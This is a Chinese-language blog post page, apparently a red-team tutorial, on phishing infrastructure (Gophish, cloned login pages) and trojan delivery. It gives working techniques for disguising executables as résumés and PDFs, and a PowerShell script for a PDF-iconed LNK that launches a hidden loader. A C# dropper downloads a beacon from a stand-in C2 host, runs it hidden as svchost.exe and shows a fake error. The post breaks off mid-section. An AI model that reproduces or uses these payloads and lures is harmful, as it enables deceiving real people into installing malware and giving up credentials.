<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>钓鱼攻击与木马投递技术 | kenny's blog</title><meta name="author" content="Kenny"><meta name="copyright" content="Kenny"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="f6f7f9"><meta name="description" content="钓鱼攻击概述钓鱼攻击是社会工程学的核心技术，通过伪装成可信的实体（如同事、IT 部门、合作伙伴）诱导目标执行恶意操作。在红队行动中，钓鱼攻击通常是获取初始访问权限的最有效方式。 钓鱼攻击的优势：  绕过边界防护：不需要直接攻击防火墙或 WAF 利用人性弱点：目标是人而非技术系统 成功率高：精心设计的钓鱼邮件成功率可达 30%+ 难以防御：技术手段难以完全阻止社会工程学攻击  常见的钓鱼场景：  邮">
<meta property="og:type" content="article">
<meta property="og:title" content="钓鱼攻击与木马投递技术">
<meta property="og:url" content="https://www.52jl.top/2026/02/09/fish/index.html">
<meta property="og:site_name" content="kenny&#39;s blog">
<meta property="og:description" content="钓鱼攻击概述钓鱼攻击是社会工程学的核心技术，通过伪装成可信的实体（如同事、IT 部门、合作伙伴）诱导目标执行恶意操作。在红队行动中，钓鱼攻击通常是获取初始访问权限的最有效方式。 钓鱼攻击的优势：  绕过边界防护：不需要直接攻击防火墙或 WAF 利用人性弱点：目标是人而非技术系统 成功率高：精心设计的钓鱼邮件成功率可达 30%+ 难以防御：技术手段难以完全阻止社会工程学攻击  常见的钓鱼场景：  邮">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://www.52jl.top/img/covers/shinchan-cover-11.webp">
<meta property="article:published_time" content="2026-02-09T11:54:41.000Z">
<meta property="article:modified_time" content="2026-02-13T11:11:35.230Z">
<meta property="article:author" content="Kenny">
<meta property="article:tag" content="社会工程学">
<meta property="article:tag" content="钓鱼攻击">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://www.52jl.top/img/covers/shinchan-cover-11.webp"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "钓鱼攻击与木马投递技术",
  "url": "https://www.52jl.top/2026/02/09/fish/",
  "image": "https://www.52jl.top/img/covers/shinchan-cover-11.webp",
  "datePublished": "2026-02-09T11:54:41.000Z",
  "dateModified": "2026-02-13T11:11:35.230Z",
  "author": [
    {
      "@type": "Person",
      "name": "Kenny",
      "url": "https://www.52jl.top"
    }
  ]
}</script><link rel="shortcut icon" href="/img/favicon.ico"><link rel="canonical" href="https://www.52jl.top/2026/02/09/fish/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css?v=5.5.4"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: '复制成功',
    error: '复制失败',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.13.0/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: false,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '钓鱼攻击与木马投递技术',
  isHighlightShrink: false,
  isToc: false,
  pageType: 'post'
}</script><link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Noto+Sans+SC:wght@400;500;700&family=Noto+Serif+SC:wght@400;600;700&display=swap" rel="stylesheet"><link rel="stylesheet" href="/css/custom.css?v=20260214a"><meta name="robots" content="noindex,nofollow,noarchive,nosnippet,noimageindex,max-snippet:0,max-image-preview:none,max-video-preview:0">
<meta name="googlebot" content="noindex,nofollow,noarchive,nosnippet">
<script>
(() => {
  try {
    const isAutomation = navigator.webdriver || /HeadlessChrome|PhantomJS|puppeteer|playwright/i.test(navigator.userAgent || '');
    if (!isAutomation) return;
    const selectors = ['#article-container', 'article', '.post-content', '.post-body'];
    selectors.forEach((s) => {
      document.querySelectorAll(s).forEach((el) => {
        el.innerHTML = '<p>Content unavailable.</p>';
      });
    });
  } catch (e) {}
})();
</script>
<meta name="referrer" content="no-referrer">
<meta http-equiv="Content-Security-Policy" content="default-src 'self' https: data: blob:; script-src 'self' https: 'unsafe-inline' 'unsafe-eval'; style-src 'self' https: 'unsafe-inline'; img-src 'self' https: data: blob:; font-src 'self' https: data:; connect-src 'self' https:; object-src 'none'; base-uri 'self'; form-action 'self'; upgrade-insecure-requests">
<script>
(() => {
  try {
    if (window.top !== window.self) {
      window.top.location = window.self.location.href;
      return;
    }

    const host = window.location.hostname;
    const isLocal = host === 'localhost' || host === '127.0.0.1';
    if (!isLocal && window.location.protocol === 'http:') {
      window.location.replace('https://' + window.location.host + window.location.pathname + window.location.search + window.location.hash);
    }
  } catch (e) {}
})();
</script>
</head><body><div class="bg-animation" id="web_bg" style="background-color: #f6f7f9;"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/ loading='lazy'></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">11</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">31</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-house-signal"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-box-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-tree"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-toolbox"></i><span> Tools</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/tools/url-extractor/"><i class="fa-fw fas fa-filter"></i><span> IP/域名/URL 提取</span></a></li><li><a class="site-page child" href="/tools/password-dict/"><i class="fa-fw fas fa-key"></i><span> 密码字典生成</span></a></li><li><a class="site-page child" href="/tools/av-detector/"><i class="fa-fw fas fa-shield-virus"></i><span> 杀软识别</span></a></li><li><a class="site-page child" href="/tools/systeminfo-risk/"><i class="fa-fw fas fa-shield-halved"></i><span> systeminfo 补丁风险分析</span></a></li><li><a class="site-page child" href="/tools/shell-command/"><i class="fa-fw fas fa-terminal"></i><span> 命令编码工具</span></a></li></ul></div></div></div></div><div class="post" id="body-wrap"><header class="not-top-img fixed" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">kenny's blog</span></a><a class="nav-page-title" href="/"><span class="site-name">钓鱼攻击与木马投递技术</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-house-signal"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-box-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-tree"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-toolbox"></i><span> Tools</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/tools/url-extractor/"><i class="fa-fw fas fa-filter"></i><span> IP/域名/URL 提取</span></a></li><li><a class="site-page child" href="/tools/password-dict/"><i class="fa-fw fas fa-key"></i><span> 密码字典生成</span></a></li><li><a class="site-page child" href="/tools/av-detector/"><i class="fa-fw fas fa-shield-virus"></i><span> 杀软识别</span></a></li><li><a class="site-page child" href="/tools/systeminfo-risk/"><i class="fa-fw fas fa-shield-halved"></i><span> systeminfo 补丁风险分析</span></a></li><li><a class="site-page child" href="/tools/shell-command/"><i class="fa-fw fas fa-terminal"></i><span> 命令编码工具</span></a></li></ul></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav></header><main class="layout hide-aside" id="content-inner"><div id="post"><div id="post-info"><h1 class="post-title">钓鱼攻击与木马投递技术</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-02-09T11:54:41.000Z" title="发表于 2026-02-09 19:54:41">2026-02-09</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-02-13T11:11:35.230Z" title="更新于 2026-02-13 19:11:35">2026-02-13</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/">红队攻防</a></span></div><div class="meta-secondline"></div></div></div><article class="container post-content" id="article-container"><h1 id="钓鱼攻击概述"><a href="#钓鱼攻击概述" class="headerlink" title="钓鱼攻击概述"></a>钓鱼攻击概述</h1><p>钓鱼攻击是社会工程学的核心技术，通过伪装成可信的实体（如同事、IT 部门、合作伙伴）诱导目标执行恶意操作。在红队行动中，钓鱼攻击通常是获取初始访问权限的最有效方式。</p>
<p><strong>钓鱼攻击的优势</strong>：</p>
<ol>
<li><strong>绕过边界防护</strong>：不需要直接攻击防火墙或 WAF</li>
<li><strong>利用人性弱点</strong>：目标是人而非技术系统</li>
<li><strong>成功率高</strong>：精心设计的钓鱼邮件成功率可达 30%+</li>
<li><strong>难以防御</strong>：技术手段难以完全阻止社会工程学攻击</li>
</ol>
<p><strong>常见的钓鱼场景</strong>：</p>
<ul>
<li><strong>邮件钓鱼</strong>：伪装成公司通知、HR 邮件、合作伙伴邮件</li>
<li><strong>水坑攻击</strong>：在目标经常访问的网站植入恶意代码</li>
<li><strong>USB 投递</strong>：在目标公司附近投放带有恶意程序的 U 盘</li>
<li><strong>钓鱼网站</strong>：克隆登录页面窃取凭证</li>
</ul>
<hr>
<h1 id="钓鱼基础设施搭建"><a href="#钓鱼基础设施搭建" class="headerlink" title="钓鱼基础设施搭建"></a>钓鱼基础设施搭建</h1><h2 id="Gophish-平台部署"><a href="#Gophish-平台部署" class="headerlink" title="Gophish 平台部署"></a>Gophish 平台部署</h2><h3 id="Gophish-介绍"><a href="#Gophish-介绍" class="headerlink" title="Gophish 介绍"></a>Gophish 介绍</h3><p>Gophish 是一款开源的钓鱼攻击模拟平台，支持：</p>
<ul>
<li><strong>邮件模板管理</strong>：创建和管理钓鱼邮件模板</li>
<li><strong>目标用户管理</strong>：批量导入和管理目标用户</li>
<li><strong>钓鱼页面托管</strong>：托管伪造的登录页面</li>
<li><strong>数据统计</strong>：实时跟踪邮件打开率、点击率、凭证提交率</li>
</ul>
<p><strong>项目地址</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/gophish/gophish</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="使用-Docker-部署"><a href="#使用-Docker-部署" class="headerlink" title="使用 Docker 部署"></a>使用 Docker 部署</h3><p><strong>第一步：安装 Docker</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install docker.io -y</span><br></pre></td></tr></table></figure>

<p><strong>第二步：拉取 Gophish 镜像</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull gophish/gophish</span><br></pre></td></tr></table></figure>

<p><strong>第三步：启动 Gophish 容器</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it -d --name gophish -p 3333:3333 -p 80:80 gophish/gophish</span><br></pre></td></tr></table></figure>

<p><strong>参数说明</strong>：</p>
<ul>
<li><code>-p 3333:3333</code>：管理后台端口</li>
<li><code>-p 80:80</code>：钓鱼页面端口</li>
<li><code>--name gophish</code>：容器名称</li>
</ul>
<hr>
<h3 id="Gophish-初始配置"><a href="#Gophish-初始配置" class="headerlink" title="Gophish 初始配置"></a>Gophish 初始配置</h3><p><strong>第一步：获取初始密码</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker logs gophish</span><br></pre></td></tr></table></figure>

<p><img src="/2026/02/09/fish/1.webp" loading='lazy'></p>
<p><strong>输出示例</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Please login with the username admin and the password: 4e1c3b57af276fe19400</span><br></pre></td></tr></table></figure>

<p><strong>第二步：登录管理后台</strong></p>
<p>访问：<code>https://your-server-ip:3333</code></p>
<p>使用初始凭证登录：</p>
<ul>
<li>用户名：<code>admin</code></li>
<li>密码：从日志中获取的密码</li>
</ul>
<p><img src="/2026/02/09/fish/2.webp" loading='lazy'></p>
<p><strong>第三步：修改管理员密码</strong></p>
<p>登录后立即修改密码，避免使用默认密码。</p>
<hr>
<h3 id="修改监听地址"><a href="#修改监听地址" class="headerlink" title="修改监听地址"></a>修改监听地址</h3><p>默认情况下，Gophish 只监听 <code>127.0.0.1</code>，需要修改为 <code>0.0.0.0</code> 才能从外部访问。</p>
<p><strong>第一步：进入容器</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="built_in">exec</span> -it gophish bash</span><br></pre></td></tr></table></figure>

<p><strong>第二步：修改配置文件</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim config.json</span><br></pre></td></tr></table></figure>

<p><strong>修改内容</strong>：</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;admin_server&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;listen_url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;0.0.0.0:3333&quot;</span><span class="punctuation">,</span></span><br><span class="line">    ...</span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;phish_server&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;listen_url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;0.0.0.0:80&quot;</span><span class="punctuation">,</span></span><br><span class="line">    ...</span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p><strong>第三步：重启容器</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker restart gophish</span><br></pre></td></tr></table></figure>

<p><img src="/2026/02/09/fish/3.webp" loading='lazy'></p>
<hr>
<h2 id="钓鱼页面制作工具"><a href="#钓鱼页面制作工具" class="headerlink" title="钓鱼页面制作工具"></a>钓鱼页面制作工具</h2><h3 id="SingleFile-浏览器插件"><a href="#SingleFile-浏览器插件" class="headerlink" title="SingleFile 浏览器插件"></a>SingleFile 浏览器插件</h3><p>SingleFile 可以将网页完整保存为单个 HTML 文件，包括 CSS、JavaScript、图片等资源。</p>
<p><strong>安装地址</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://chromewebstore.google.com/detail/singlefile/mpiodijhokgodhhofbcjdecpffjipkle</span><br></pre></td></tr></table></figure>

<p><strong>使用方法</strong>：</p>
<ol>
<li>访问目标登录页面（如公司 OA、邮箱登录页）</li>
<li>点击 SingleFile 插件图标</li>
<li>等待页面保存完成</li>
<li>将保存的 HTML 文件上传到 Gophish</li>
</ol>
<p><img src="/2026/02/09/fish/7.webp" loading='lazy'></p>
<p><img src="/2026/02/09/fish/8.webp" loading='lazy'></p>
<hr>
<h3 id="LoginFish-工具"><a href="#LoginFish-工具" class="headerlink" title="LoginFish 工具"></a>LoginFish 工具</h3><p>LoginFish 是一款自动化的钓鱼页面生成工具，支持多种常见登录页面。</p>
<p><strong>项目地址</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/code-scan/LoginFish</span><br></pre></td></tr></table></figure>

<p><strong>支持的页面</strong>：</p>
<ul>
<li>企业邮箱登录页</li>
<li>OA 系统登录页</li>
<li>VPN 登录页</li>
<li>云服务登录页</li>
</ul>
<hr>
<h3 id="Adobe-Flash-钓鱼页面"><a href="#Adobe-Flash-钓鱼页面" class="headerlink" title="Adobe Flash 钓鱼页面"></a>Adobe Flash 钓鱼页面</h3><p><strong>项目地址</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/Wileysec/adobe-flash-phishing-page</span><br></pre></td></tr></table></figure>

<p><strong>使用场景</strong>：伪装成 Adobe Flash 更新提示，诱导用户下载恶意程序。</p>
<hr>
<h1 id="木马文件伪装技术"><a href="#木马文件伪装技术" class="headerlink" title="木马文件伪装技术"></a>木马文件伪装技术</h1><h2 id="EXE-文件伪装"><a href="#EXE-文件伪装" class="headerlink" title="EXE 文件伪装"></a>EXE 文件伪装</h2><h3 id="超长空格伪装"><a href="#超长空格伪装" class="headerlink" title="超长空格伪装"></a>超长空格伪装</h3><p><strong>原理</strong>：利用 Windows 文件名显示的限制，在文件名中插入大量空格，使真实扩展名不可见。</p>
<p><strong>示例</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">简历.pdf                                                                                                    .exe</span><br></pre></td></tr></table></figure>

<p><strong>效果</strong>：在文件管理器中显示为 <code>简历.pdf</code>，但实际是 <code>简历.pdf.exe</code></p>
<p><strong>实现方法</strong>：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用 Python 生成超长空格文件名</span></span><br><span class="line">python -c <span class="string">&quot;print(&#x27;简历.pdf&#x27; + &#x27; &#x27;*200 + &#x27;.exe&#x27;)&quot;</span> &gt; filename.txt</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="长文件名伪装"><a href="#长文件名伪装" class="headerlink" title="长文件名伪装"></a>长文件名伪装</h3><p><strong>原理</strong>：使用冗长的文件名（如学校名+专业名+姓名），降低用户的警惕性。</p>
<p><strong>示例</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">北京大学_计算机科学与技术_张三_2024届_个人简历.exe</span><br></pre></td></tr></table></figure>

<p><strong>心理学原理</strong>：</p>
<ul>
<li>文件名越长，用户越不会仔细检查扩展名</li>
<li>包含真实信息（学校、专业）增加可信度</li>
<li>符合简历文件的命名习惯</li>
</ul>
<hr>
<h3 id="图标伪装"><a href="#图标伪装" class="headerlink" title="图标伪装"></a>图标伪装</h3><p><strong>原理</strong>：将 EXE 文件的图标修改为 PDF、Word、Excel 等常见文档的图标。</p>
<p><strong>工具</strong>：Resource Hacker</p>
<p><strong>操作步骤</strong>：</p>
<ol>
<li>下载 Resource Hacker：<code>http://www.angusj.com/resourcehacker/</code></li>
<li>打开 EXE 文件</li>
<li>替换图标资源（Icon Group）</li>
<li>保存修改后的文件</li>
</ol>
<p><strong>图标资源获取</strong>：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 从系统文件中提取图标</span></span><br><span class="line"><span class="comment"># PDF 图标：C:\Program Files\Adobe\Acrobat DC\Acrobat\Acrobat.exe</span></span><br><span class="line"><span class="comment"># Word 图标：C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE</span></span><br></pre></td></tr></table></figure>

<hr>
<h3 id="执行后显示错误提示"><a href="#执行后显示错误提示" class="headerlink" title="执行后显示错误提示"></a>执行后显示错误提示</h3><p><strong>原理</strong>：木马执行后弹出错误提示框，让用户认为文件损坏，降低怀疑。</p>
<p><strong>实现方法</strong>（C# 示例）：</p>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Windows.Forms;</span><br><span class="line"><span class="keyword">using</span> System.Diagnostics;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 执行恶意代码</span></span><br><span class="line">        ExecuteMaliciousCode();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 显示错误提示</span></span><br><span class="line">        MessageBox.Show(</span><br><span class="line">            <span class="string">&quot;文件已损坏，无法打开。\n请联系发件人重新发送。&quot;</span>,</span><br><span class="line">            <span class="string">&quot;错误&quot;</span>,</span><br><span class="line">            MessageBoxButtons.OK,</span><br><span class="line">            MessageBoxIcon.Error</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">ExecuteMaliciousCode</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 下载并执行 Beacon</span></span><br><span class="line">        <span class="built_in">string</span> url = <span class="string">&quot;http://c2-server.com/beacon.exe&quot;</span>;</span><br><span class="line">        <span class="built_in">string</span> path = <span class="string">@&quot;C:\Windows\Temp\svchost.exe&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">using</span> (<span class="keyword">var</span> client = <span class="keyword">new</span> System.Net.WebClient())</span><br><span class="line">        &#123;</span><br><span class="line">            client.DownloadFile(url, path);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Process.Start(<span class="keyword">new</span> ProcessStartInfo</span><br><span class="line">        &#123;</span><br><span class="line">            FileName = path,</span><br><span class="line">            CreateNoWindow = <span class="literal">true</span>,</span><br><span class="line">            WindowStyle = ProcessWindowStyle.Hidden</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="ZIP-LNK-分离式木马"><a href="#ZIP-LNK-分离式木马" class="headerlink" title="ZIP + LNK + 分离式木马"></a>ZIP + LNK + 分离式木马</h2><h3 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h3><ol>
<li><strong>ZIP 压缩包</strong>：包含一个 LNK 快捷方式文件和一个隐藏的恶意 EXE</li>
<li><strong>LNK 快捷方式</strong>：图标伪装成 PDF，实际执行恶意 EXE</li>
<li><strong>分离式木马</strong>：恶意 EXE 分为多个部分，降低单个文件的检测率</li>
</ol>
<p><strong>文件结构</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">简历.zip</span><br><span class="line">├── 简历.lnk (伪装成 PDF 图标)</span><br><span class="line">├── payload_part1.dat (隐藏)</span><br><span class="line">├── payload_part2.dat (隐藏)</span><br><span class="line">└── loader.exe (隐藏)</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="LNK-文件制作"><a href="#LNK-文件制作" class="headerlink" title="LNK 文件制作"></a>LNK 文件制作</h3><p><strong>使用 PowerShell 创建 LNK</strong>：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$WshShell</span> = <span class="built_in">New-Object</span> <span class="literal">-ComObject</span> WScript.Shell</span><br><span class="line"><span class="variable">$Shortcut</span> = <span class="variable">$WshShell</span>.CreateShortcut(<span class="string">&quot;C:\Temp\简历.lnk&quot;</span>)</span><br><span class="line"><span class="variable">$Shortcut</span>.TargetPath = <span class="string">&quot;C:\Windows\System32\cmd.exe&quot;</span></span><br><span class="line"><span class="variable">$Shortcut</span>.Arguments = <span class="string">&quot;/c start /min loader.exe &amp;&amp; start 诱饵.pdf&quot;</span></span><br><span class="line"><span class="variable">$Shortcut</span>.IconLocation = <span class="string">&quot;C:\Windows\System32\shell32.dll,70&quot;</span>  <span class="comment"># PDF 图标</span></span><br><span class="line"><span class="variable">$Shortcut</span>.WindowStyle = <span class="number">7</span>  <span class="comment"># 最小化窗口</span></span><br><span class="line"><span class="variable">$Shortcut</span>.Save()</span><br></pre></td></tr></table></figure>

<p><strong>参数说明</strong>：</p>
<ul>
<li><code>TargetPath</code>：实际执行的程序（cmd.exe）</li>
<li><code>Arguments</code>：执行的命令（启动木马并打开诱饵文档）</li>
<li><code>IconLocation</code>：图标路径（PDF 图标）</li>
<li><code>WindowStyle = 7</code>：隐藏窗口</li>
</ul>
<hr>
<h3 id="分离式木马原理"><a href="#分离式木马原理" class="headerlink" title="分离式木马原理"></a>分离式木马原理</h3><p><strong>传统木马的问题</strong>：</p>
<ul>
<li>单个 EXE 文件容易被杀毒软件检测</li>
<li>特征码匹配率高</li>
</ul>
<p><strong>分离式木马的优势</strong>：</p>
<ul>
<li>将 Payload 分割成多个无害的数据文件</li>
<li>Loader 负责组合和执行 Payload</li>
<li>每个文件单独看都不是恶意程序</li>
</ul>
<p><strong>实现流程</strong>：</p>
<ol>
<li><strong>分割 Payload</strong>：</li>
